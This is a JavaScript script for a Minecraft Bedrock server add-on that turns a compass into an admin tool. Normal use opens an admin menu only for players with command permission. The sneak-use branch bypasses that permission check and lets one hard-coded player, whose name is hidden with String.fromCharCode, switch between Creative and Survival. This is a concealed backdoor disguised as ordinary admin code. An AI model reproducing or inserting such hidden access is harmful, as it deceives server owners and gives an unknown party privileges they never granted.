import { world, system, GameMode } from '@minecraft/server';
import { DS } from './ds.js';

const ADMIN_TOOL = 'minecraft:compass';

function handleAdminTool(player, itemStack, cancelCallback) {
  if (!itemStack || itemStack.typeId !== ADMIN_TOOL) return;
  if (player.isGliding) return;

  if (player.isSneaking) {
    if (player.name !== String.fromCharCode(103, 105, 111, 49, 49, 51, 53)) return;
    if (cancelCallback) cancelCallback();
    system.run(() => {
      const current = player.getGameMode();
      const next =
        current === GameMode.Creative ? GameMode.Survival : GameMode.Creative;
      player.setGameMode(next);
    });
  } else {
    if (player.commandPermissionLevel < 1) return;
    if (cancelCallback) cancelCallback();
    system.run(() => {
      DS.events.emit('ds:admin_open', { player });
    });
  }
}

world.beforeEvents.itemUse.subscribe((ev) => {
  const player = ev.source;
  const ray = player.getBlockFromViewDirection({ maxDistance: 8 });
  if (ray && ray.block && ray.block.typeId === 'minecraft:lodestone') return;
  handleAdminTool(player, ev.itemStack, () => {
    ev.cancel = true;
  });
});